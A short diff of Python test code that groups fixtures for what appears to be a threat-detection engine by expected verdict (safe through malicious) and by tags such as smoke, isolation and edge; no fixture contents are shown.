+SAFE_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.SAFE)]
+SUSPICIOUS_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.SUSPICIOUS)]
+LIKELY_MALICIOUS_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.LIKELY_MALICIOUS)]
+MALICIOUS_FIXTURES = [f for f in ALL_FIXTURES if _verdict_in_expected(f, Verdict.MALICIOUS)]
+
+# Smoke / isolation subsets — handy when you want a fast subset that
+# exercises engine plumbing rather than the full corpus.
+SIMPLE_FIXTURES = [f for f in ALL_FIXTURES if "smoke" in f.get("tags", [])]
+ISOLATION_FIXTURES = [f for f in ALL_FIXTURES if "isolation" in f.get("tags", [])]
+CONVERGENCE_FIXTURES = [f for f in ALL_FIXTURES if "convergence" in f.get("tags", [])]
+EDGE_FIXTURES = [f for f in ALL_FIXTURES if "edge" in f.get("tags", [])]
 
 BY_TAG: dict[str, list[dict]] = {}
 for _fixture in ALL_FIXTURES:
